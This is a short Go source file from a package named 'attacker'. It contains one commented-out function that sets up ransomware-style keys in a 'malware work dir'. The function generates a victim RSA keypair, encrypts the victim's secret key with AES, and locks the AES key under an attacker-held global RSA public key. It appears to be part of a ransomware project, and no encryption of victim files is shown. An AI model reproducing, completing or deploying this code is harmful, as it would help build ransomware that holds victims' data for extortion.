package attacker

// Generate all the appropriate keys in the malware
// work dir.
//func GenerateKeys() error {
//    // global rsa key
//    pk, err := ImportPublicKey()
//    if err != nil {
//        return err
//    }
//
//    // local rsa keys
//    sk, err := util.GenerateKeyRSA(rsaKeyBits)
//    if err != nil {
//        return errors.Wrap(pkg, "failed to generate RSA secret key", err)
//    }
//    pkData, err := util.ExportDERPublicKeyRSA(&sk.PublicKey)
//    if err != nil {
//        return errors.Wrap(pkg, "failed to marshal RSA public key", err)
//    }
//    err = ioutil.WriteFile(filepath.Join(workDir, victimPublicKey), pkData, 0644)
//    if err != nil {
//        return errors.Wrap(pkg, "failed to write RSA public key", err)
//    }
//
//    // aes key stuff
//    aesKey, err := util.GenerateAES()
//    if err != nil {
//        return errors.Wrap(pkg, "failed to generate AES key", err)
//    }
//    aesIV, err := util.GenerateAES()
//    if err != nil {
//        return errors.Wrap(pkg, "failed to generate AES IV", err)
//    }
//    aesBlock, _ := aes.NewCipher(aesKey)
//    aesCiph := cipher.NewCTR(aesBlock, aesIV)
//
//    // export rsa pub encrypted with aes
//    skData, err := util.ExportDERSecretKeyRSA(sk)
//    if err != nil {
//        return errors.Wrap(pkg, "failed to marshal RSA secret key", err)
//    }
//    skData = util.Pad(skData, aes.BlockSize)
//    aesCiph.XORKeyStream(skData, skData)
//    err = ioutil.WriteFile(filepath.Join(workDir, victimSecretKey), skData, 0644)
//    if err != nil {
//        return errors.Wrap(pkg, "failed to write RSA secret key", err)
//    }
//
//    // export aes key encrypted with rsa pub
//    ivKey := append(aesIV, aesKey...)
//    aesEncrypted, err := rsa.EncryptPKCS1v15(rand.Reader, pk, ivKey)
//    if err != nil {
//        return errors.Wrap(pkg, "failed to encrypt AES key", err)
//    }
//    err = ioutil.WriteFile(filepath.Join(workDir, victimAESKey), aesEncrypted, 0644)
//    if err != nil {
//        return errors.Wrap(pkg, "failed to write AES key", err)
//    }
//
//    return nil
//}
